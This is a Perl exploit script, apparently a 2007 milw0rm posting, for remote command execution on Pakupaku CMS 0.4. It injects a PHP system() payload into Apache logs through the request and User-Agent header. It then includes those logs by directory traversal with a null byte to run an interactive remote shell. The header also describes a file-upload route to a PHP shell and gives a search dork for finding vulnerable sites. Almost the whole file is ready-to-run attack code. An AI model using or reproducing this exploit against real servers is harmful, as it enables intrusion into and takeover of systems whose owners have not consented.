#!/usr/bin/perl
#########################################################################################
# Pakupaku CMS <= 0.4 Remote File Upload Vulnerability
# 1- [Path_Script]/index.php?page=Uploads
# 2- Upload GoLd-M.php <= [Php Shell]
# 3- [Path_Script]/uploads/GoLd-M.php <= [Php Shell]
# D.Script :  http://heanet.dl.sourceforge.net/sourceforge/pakupaku/pakupaku-0.4.tar.gz  #
#########################################################################################
# D0RK  :http://www.google.com/search?client=opera&rls=en&q=Powered+by+Pakupaku+CMS&sourceid=opera&ie=utf-8&oe=utf-8
# Pakupaku CMS 0.4 (Local Inclusion) Remote Command Execution Exploit

use IO::Socket;
use LWP::Simple;

#ripped from rgod
@apache=(
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../.. /../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

print " ########################################################################\n";
print " # Pakupaku CMS 0.4 (Local Inclusion) Remote Command Execution Exploit  #\n";
print " # Discovered by: GoLd_M = [Mahmood_ali]                                #\n";
print " # Thanx To : Tryag-Team & Asbmay's Group & bd0rk & All My Friends      #\n";
print " ########################################################################\n\n";

if (@ARGV < 3)
{

      print " ########################################################################\n";
      print " # Usage: 3xp|017.pl [site] [Path] [apache_path]                        #\n";
      print " # Apache Path:                                                         #\n";
      print " ########################################################################\n";
    $i = 0;
    while($apache[$i])
    { print "[$i] $apache[$i]\n";$i++;}
    exit();
}

$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];

print "[RST] Injecting some code in log files...\n";
$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";
print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "User-Agent: ".$CODE."\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);
print "[RST] Shell!! write q to exit !\n";
print "[RST] IF not working try another apache path\n\n";

print "[shell] ";$cmd = <STDIN>;

while($cmd !~ "q") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "[RST] Could not connect to host.\n\n";

    print $socket "GET ".$path."index.php?page=".$apache[$apachepath]."%00&cmd=$cmd HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "[shell] ";
    $cmd = <STDIN>;
}

# milw0rm.com [2007-08-29]